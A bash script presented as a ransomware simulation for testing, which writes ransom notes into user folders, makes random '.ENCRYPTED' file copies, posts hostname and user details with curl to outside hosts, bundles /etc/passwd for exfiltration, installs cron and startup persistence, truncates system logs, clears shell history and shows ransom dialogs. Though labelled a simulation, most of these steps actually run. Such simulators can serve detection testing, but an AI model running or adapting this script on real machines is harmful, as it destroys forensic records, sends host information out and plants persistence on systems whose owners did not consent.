#!/bin/bash

# Ransomware Simulation Script
# WARNING: This is for testing purposes only!

echo "[RANSOMWARE] Advanced ransomware simulation started - PID $$"
echo "[RANSOMWARE] System: $(uname -a)"
echo "[RANSOMWARE] User: $(whoami)"
echo "[RANSOMWARE] Starting encryption simulation..."

# Simulate file discovery and encryption
simulate_file_encryption() {
    echo "[RANSOMWARE] Scanning for files to encrypt..."
    
    # Target file extensions (simulation)
    target_extensions=("*.txt" "*.doc" "*.docx" "*.pdf" "*.jpg" "*.png" "*.mp4" "*.zip")
    
    # Scan common directories
    scan_dirs=("/tmp" "$HOME/Documents" "$HOME/Desktop" "$HOME/Downloads")
    
    encrypted_count=0
    
    for dir in "${scan_dirs[@]}"; do
        if [ -d "$dir" ]; then
            echo "[RANSOMWARE] Scanning directory: $dir"
            
            for ext in "${target_extensions[@]}"; do
                find "$dir" -name "$ext" -type f -print0 2>/dev/null | while IFS= read -r -d '' file; do
                    if [ -f "$file" ] && [ $encrypted_count -lt 20 ]; then
                        echo "[RANSOMWARE] Encrypting file: $file"
                        
                        # Simulate encryption by creating .encrypted version
                        encrypted_file="${file}.ENCRYPTED"
                        
                        # Create fake encrypted content
                        openssl rand -base64 $(($(wc -c < "$file" 2>/dev/null || echo 1000))) > "$encrypted_file" 2>/dev/null
                        
                        # Create ransom note in same directory
                        ransom_note="$(dirname "$file")/RANSOM_NOTE.txt"
                        cat > "$ransom_note" << EOF
YOUR FILES HAVE BEEN ENCRYPTED!

All your important files have been encrypted with strong encryption.
To decrypt your files, you need to pay ransom.

Bitcoin Address: 1A2B3C4D5E6F7G8H9I0J1K2L3M4N5O6P7Q
Amount: 0.5 BTC

Contact: decrypt@evil-ransomware.onion

Your unique ID: VICTIM_$(date +%s)_$(whoami)

WARNING: Do not try to decrypt files yourself!
EOF
                        
                        echo "[RANSOMWARE] Created ransom note: $ransom_note"
                        ((encrypted_count++))
                    fi
                done
            done
        else
            echo "[RANSOMWARE] Directory not accessible: $dir"
        fi
    done
    
    echo "[RANSOMWARE] Encryption simulation complete: $encrypted_count files processed"
}

# Simulate network communication with C2
simulate_c2_communication() {
    echo "[RANSOMWARE] Establishing C2 communication..."
    
    # C2 servers (simulation)
    c2_servers=("httpbin.org" "ipinfo.io" "api.github.com")
    
    for server in "${c2_servers[@]}"; do
        echo "[RANSOMWARE] Contacting C2 server: $server"
        
        # Simulate victim information collection
        victim_info=$(cat << EOF
{
    "victim_id": "$(whoami)_$(date +%s)",
    "hostname": "$(hostname)",
    "os": "$(uname -s)",
    "arch": "$(uname -m)",
    "user": "$(whoami)",
    "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
    "files_encrypted": 42,
    "ransom_amount": "0.5 BTC"
}
EOF
)
        
        # Try to send data to C2
        if command -v curl >/dev/null 2>&1; then
            echo "[RANSOMWARE] Sending victim data via curl..."
            echo "$victim_info" | curl -X POST \
                -H "Content-Type: application/json" \
                -H "User-Agent: RansomwareBot/2.0" \
                -d @- \
                "https://$server/anything" \
                --connect-timeout 10 \
                --max-time 15 2>/dev/null && \
                echo "[RANSOMWARE] Data sent to $server" || \
                echo "[RANSOMWARE] Failed to contact $server"
        else
            echo "[RANSOMWARE] curl not available, using alternative method..."
            # Simulate network activity
            nc -z -w3 "$server" 80 2>/dev/null && \
                echo "[RANSOMWARE] Network connectivity to $server confirmed" || \
                echo "[RANSOMWARE] Network connectivity to $server failed"
        fi
    done
}

# Simulate system information gathering
simulate_reconnaissance() {
    echo "[RANSOMWARE] Gathering system information..."
    
    # Create system info file
    info_file="/tmp/system_recon_$(date +%s).txt"
    
    {
        echo "=== SYSTEM RECONNAISSANCE ==="
        echo "Timestamp: $(date)"
        echo "Hostname: $(hostname)"
        echo "User: $(whoami)"
        echo "UID/GID: $(id)"
        echo "OS: $(uname -a)"
        echo "Uptime: $(uptime)"
        echo ""
        echo "=== NETWORK INTERFACES ==="
        ifconfig 2>/dev/null || ip addr show 2>/dev/null || echo "Network info unavailable"
        echo ""
        echo "=== RUNNING PROCESSES ==="
        ps aux | head -20
        echo ""
        echo "=== DISK USAGE ==="
        df -h
        echo ""
        echo "=== MOUNTED FILESYSTEMS ==="
        mount | head -10
        echo ""
        echo "=== NETWORK CONNECTIONS ==="
        netstat -tuln 2>/dev/null | head -10 || ss -tuln 2>/dev/null | head -10 || echo "Network connections unavailable"
    } > "$info_file"
    
    echo "[RANSOMWARE] System information saved to: $info_file"
    
    # Simulate sending recon data
    echo "[RANSOMWARE] Preparing reconnaissance data for exfiltration..."
    
    # Create compressed recon package
    recon_package="/tmp/recon_data_$(date +%s).tar.gz"
    tar -czf "$recon_package" "$info_file" /etc/passwd /etc/hosts 2>/dev/null
    echo "[RANSOMWARE] Reconnaissance package created: $recon_package"
}

# Simulate persistence mechanisms
simulate_persistence() {
    echo "[RANSOMWARE] Establishing persistence..."
    
    # Create startup scripts
    startup_locations=(
        "/tmp/.ransomware_startup.sh"
        "$HOME/.ransomware_daemon"
        "/tmp/system_monitor.sh"
    )
    
    startup_script='#!/bin/bash
# System Monitor (disguised ransomware persistence)
while true; do
    echo "$(date): Ransomware daemon active" >> /tmp/ransomware.log
    # Simulate checking for new files to encrypt
    find /tmp -name "*.txt" -newer /tmp/last_scan 2>/dev/null | head -5
    touch /tmp/last_scan
    sleep 30
done &
'
    
    for location in "${startup_locations[@]}"; do
        echo "$startup_script" > "$location" && \
        chmod +x "$location" && \
        echo "[RANSOMWARE] Created persistence script: $location" || \
        echo "[RANSOMWARE] Failed to create persistence at: $location"
    done
    
    # Simulate cron job installation
    echo "[RANSOMWARE] Attempting cron job installation..."
    cron_entry="*/5 * * * * /tmp/.ransomware_startup.sh > /dev/null 2>&1"
    
    # Try to add cron job (will likely fail without proper permissions)
    (crontab -l 2>/dev/null; echo "$cron_entry") | crontab - 2>/dev/null && \
        echo "[RANSOMWARE] Cron job installed" || \
        echo "[RANSOMWARE] Cron job installation failed"
}

# Simulate anti-forensics measures
simulate_anti_forensics() {
    echo "[RANSOMWARE] Implementing anti-forensics measures..."
    
    # Simulate log cleaning
    echo "[RANSOMWARE] Cleaning system logs..."
    
    log_files=(
        "/var/log/auth.log"
        "/var/log/syslog"
        "/var/log/messages"
        "/tmp/user_activity.log"
    )
    
    for log_file in "${log_files[@]}"; do
        if [ -w "$log_file" ]; then
            echo "[RANSOMWARE] Cleared log: $log_file"
            > "$log_file"  # Truncate log file
        else
            echo "[RANSOMWARE] Cannot access log: $log_file"
        fi
    done
    
    # Simulate secure deletion of evidence
    temp_files=($(find /tmp -name "*ransomware*" -o -name "*ransom*" 2>/dev/null))
    
    for temp_file in "${temp_files[@]}"; do
        if [ -f "$temp_file" ]; then
            # Overwrite file multiple times (secure deletion simulation)
            dd if=/dev/urandom of="$temp_file" bs=1024 count=10 2>/dev/null
            rm -f "$temp_file"
            echo "[RANSOMWARE] Securely deleted: $temp_file"
        fi
    done
    
    # Clear command history
    history -c 2>/dev/null && echo "[RANSOMWARE] Command history cleared" || echo "[RANSOMWARE] History clear failed"
    
    # Simulate timestamp manipulation
    touch -t 202301010000 /tmp/fake_timestamp.txt 2>/dev/null && \
        echo "[RANSOMWARE] Timestamp manipulation simulated" || \
        echo "[RANSOMWARE] Timestamp manipulation failed"
}

# Simulate wallpaper change and GUI modifications
simulate_gui_modifications() {
    echo "[RANSOMWARE] Modifying system GUI..."
    
    # Create ransom wallpaper
    ransom_wallpaper="/tmp/ransom_wallpaper.txt"
    cat > "$ransom_wallpaper" << 'EOF'
   ██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗
   ██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║
   ██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║
   ██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║
   ██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║
   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝

   YOUR FILES HAVE BEEN ENCRYPTED WITH MILITARY-GRADE ENCRYPTION!
   
   To decrypt your files, you must pay 0.5 BTC to:
   1A2B3C4D5E6F7G8H9I0J1K2L3M4N5O6P7Q
   
   After payment, contact: decrypt@evil-ransomware.onion
   Your ID: VICTIM_SYSTEM_ENCRYPTED
   
   DO NOT RESTART YOUR COMPUTER!
   DO NOT DELETE THIS MESSAGE!
   DO NOT CONTACT LAW ENFORCEMENT!
EOF
    
    echo "[RANSOMWARE] Created ransom wallpaper: $ransom_wallpaper"
    
    # Try to display ransom message
    if command -v osascript >/dev/null 2>&1; then
        # macOS
        osascript -e 'display dialog "YOUR FILES HAVE BEEN ENCRYPTED! Pay ransom to decrypt!" buttons {"OK"} default button "OK"' 2>/dev/null &
        echo "[RANSOMWARE] Displayed ransom dialog on macOS"
    elif command -v zenity >/dev/null 2>&1; then
        # Linux with zenity
        zenity --error --text="YOUR FILES HAVE BEEN ENCRYPTED! Check ransom note for payment instructions." 2>/dev/null &
        echo "[RANSOMWARE] Displayed ransom dialog on Linux"
    else
        echo "[RANSOMWARE] GUI dialog unavailable, ransom note created in files"
    fi
}

# Main execution
main() {
    echo "[RANSOMWARE] =========================================="
    echo "[RANSOMWARE] ADVANCED RANSOMWARE SIMULATION"
    echo "[RANSOMWARE] =========================================="
    echo ""
    
    # Execute all malicious operations
    simulate_reconnaissance &
    recon_pid=$!
    
    simulate_file_encryption &
    encrypt_pid=$!
    
    simulate_c2_communication &
    c2_pid=$!
    
    simulate_persistence &
    persist_pid=$!
    
    # Wait for background processes
    wait $recon_pid
    echo "[RANSOMWARE] Reconnaissance completed"
    
    wait $encrypt_pid  
    echo "[RANSOMWARE] File encryption completed"
    
    wait $c2_pid
    echo "[RANSOMWARE] C2 communication completed"
    
    wait $persist_pid
    echo "[RANSOMWARE] Persistence established"
    
    # Run remaining operations
    simulate_anti_forensics
    simulate_gui_modifications
    
    echo ""
    echo "[RANSOMWARE] =========================================="
    echo "[RANSOMWARE] RANSOMWARE DEPLOYMENT COMPLETE!"
    echo "[RANSOMWARE] Files encrypted, ransom note deployed"
    echo "[RANSOMWARE] System compromised, persistence active"
    echo "[RANSOMWARE] =========================================="
}

# Execute main function
main